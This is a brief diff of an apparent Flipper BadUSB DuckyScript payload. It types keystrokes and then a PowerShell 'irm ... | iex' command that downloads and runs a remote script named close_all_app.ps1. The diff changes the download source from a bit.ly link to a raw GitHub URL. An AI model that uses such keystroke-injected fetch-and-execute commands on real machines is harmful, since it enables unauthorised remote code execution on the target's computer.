@@ -39,5 +39,5 @@ TAB
 TAB
 ENTER
 DELAY 2000
-STRING irm bit.ly/CloseAllApplicationsScript | iex
+STRING irm https://raw.githubusercontent.com/wzqvip/Flipper-BadUSB/main/1-resources/close_all_app.ps1 | iex
 ENTER
